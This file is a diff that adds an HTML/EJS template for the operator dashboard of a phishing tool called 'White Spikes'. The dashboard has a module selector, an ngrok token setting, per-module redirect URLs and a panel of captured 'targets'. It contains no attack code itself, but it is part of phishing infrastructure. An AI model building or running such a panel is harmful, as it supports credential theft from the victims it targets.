@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>White Spikes DASHBOARD | Pishing Tool</title>
+    <link rel="stylesheet" href="./assets/css/main.css">
+    <link rel="stylesheet" href="./assets/css/panel.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.1/socket.io.js"
+        integrity="sha512-xbQU0+iHqhVt7VIXi6vBJKPh3IQBF5B84sSHdjKiSccyX/1ZI7Vnkt2/8y8uruj63/DVmCxfUNohPNruthTEQA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="./assets/js/panel-b.js" defer></script>
+</head>
+
+<body>
+    <header class="header">
+        <div class="left">
+            <h2><b>@</b>White<span>Spikes</span></h2>
+            <h6>- Created by Madhan</h6>
+        </div>
+
+        <div class="right">
+            <h4>
+                <pre>TOOL</pre>
+            </h4>
+            <select id="tools">
+                <option value="none">none</option>
+                <% for(let i of modules) { %>
+                    <option value="<%- i %>"><%- i %></option>
+                    <% } %>
+            </select>
+            <button id="link-btn" class="btn">
+                <i class="fa-solid fa-link"></i>
+            </button>
+            <button class="btn" title="configuration tab" id="config-btn">
+                <i class="fa-solid fa-gear"></i>
+            </button>
+            <button class="btn" title="targets" id="targets-btn">
+                <i class="fa-solid fa-users-viewfinder"></i>
+            </button>
+            <a href="/logout">
+                <button class="btn">
+                    <i class="fa-solid fa-arrow-right-from-bracket"></i>
+                </button>
+            </a>
+        </div>
+    </header>
+
+    <div class="content">
+        <div class="terminal-box">
+
+        </div>
+    </div>
+
+    <div class="config-tab">
+        <div class="head">
+            <h2>configuration</h2>
+            <button class="btn" id="config-tab-close"><i class="fa-solid fa-xmark"></i></button>
+        </div>
+        <form>
+            <h2>app config</h2>
+            <div class="inp">
+                <label>token</label>
+                <input type="text" name="ngrokToken" value="<%- data.ngrokToken %>" required>
+            </div>
+            <div class="inp">
+                <label>browser</label>
+                <input type="text" name="browser" value="<%- data.browser %>" required>
+            </div>
+
+            <h2>redirects</h2>
+            <div class="redirects">
+                <% for(let key in data["redirects"]) {%>
+                    <div class="inp">
+                        <label><%- key %></label>
+                        <input data-redirects="true" type="text" placeholder="https://example.com"
+                            value="<%- data['redirects'][key] %>" name="<%- key %>" required>
+                    </div>
+                    <% } %>
+            </div>
+
+            <h2></h2>
+
+
+            <div class="inp" style="display: block;">
+                <button class="btn" type="submit">SET</button>
+            </div>
+        </form>
+    </div>
+
+    <div class="targets-tab">
+        <div class="head">
+            <h2>targets</h2>
+            <div style="display: flex;align-items: center;gap: .4rem;">
+                <pre>Delete All: </pre>
+                <button class="btn" title="delete all targets" id="delete-all-targets">
+                    <i class="fa-regular fa-trash-can"></i>
+                </button>
+
+                <button class="btn" id="targets-close-btn"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+        </div>
+
+        <div class="content">
+
+        </div>
+    </div>
+</body>
+
+</html>
